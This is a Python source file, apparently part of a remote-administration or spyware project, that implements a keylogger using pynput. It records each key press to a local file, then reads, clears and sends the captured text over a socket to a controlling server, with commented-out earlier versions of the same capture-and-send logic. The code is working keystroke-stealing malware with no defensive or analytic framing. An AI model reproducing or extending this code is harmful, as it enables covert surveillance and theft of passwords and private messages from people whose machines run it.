from pynput import keyboard
import threading
import config
import struct
import time
import os


SERVER =  "127.0.0.1"
PORT = 5000
ADDRESS = (SERVER, PORT)
HEADER_SIZE = 1024
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"


script_dir = os.path.dirname(__file__)
filePath = os.path.join(script_dir, "tempData/keylogger.txt")

def on_key_press(key):
    if not(config.hook) : return False
    with open(filePath, "a") as fi:
        try:
            if key.char == None: return
            fi.write(key.char)
            print(key.char)
        except AttributeError:
            fi.write(f'||{str(key)}||')
            print(key)

# Set up the listener
def hook():
    with keyboard.Listener(on_press=on_key_press, on_release=None) as listener:
        listener.join()

def deleteKeyLoggerFile():
    with open(filePath, "w") as fo:
        fo.truncate(0)

def sendKeyLogger(clientsocket):
    keylogger_content = ""
    with open(filePath, "r") as fi:
        keylogger_content = fi.read()
    deleteKeyLoggerFile()
    print(keylogger_content)
    keylogger_content = keylogger_content.encode(FORMAT)
    clientsocket.sendall(len(keylogger_content).to_bytes(4, 'big'))
    clientsocket.sendall(keylogger_content)

def startedKeyLogger():
    config.hook = True
    keylogger_thread = threading.Thread(target = hook)
    keylogger_thread.start()















# class KeyboardActivityRecorder:
#     def __init__(self, client_socket):
#         self.client_socket = client_socket
#         self.keys_pressed = []
#         self.recording = False

#     def on_key_press(self, key):
#         try:
#             self.keys_pressed.append(key.char)
#         except AttributeError:
#             self.keys_pressed.append(str(key))

#     def start_recording(self):
#         self.recording = True
#         with keyboard.Listener(on_press=self.on_key_press) as listener:
#             listener.join()

#     def stop_recording(self):
#         self.recording = False

#     def replay_keys(self):
#         recorded_keys = ''.join(self.keys_pressed)
#         self.client_socket.sendall(recorded_keys.encode(FORMAT))



# def send_string(client_socket, s):
#     # Send the length of the string
#     client_socket.sendall(struct.pack('!I', len(s)))
#     # Send the string itself
#     client_socket.sendall(s.encode('utf-8'))


# def on_key_press(self, key):
#     try:
#         self.keys_pressed.append(key.char)
#     except AttributeError:
#         self.keys_pressed.append(str(key))

# def start_recording(self):
#     with keyboard.Listener(on_press=self.on_key_press) as listener:
#         listener.join()

# def stop_recording(self):
#         self.recording = False

# def replay_keys(self):
#         recorded_keys = ''.join(self.keys_pressed)
#         send_string(self.client_socket, recorded_keys)





# Set up the listener
# def hook():
#     with keyboard.Listener(on_press=on_key_press) as listener:
#         listener.join()

# def sendKeyLogger(clientsocket):
#     keylogger_content = ""
#     with open(filePath, "r+") as fi:
#         keylogger_content = fi.read()
#         if len(keylogger_content) == 0 :
#             clientsocket.send("0".encode())
#             return
#         fi.seek(0)
#         fi.truncate()
#     clientsocket.send("1".encode())
#     clientsocket.send(keylogger_content.encode())

# def startedKeyLogger():
#     config.hook = True
#     keylogger_thread = threading.Thread(target = hook)
#     keylogger_thread.start()




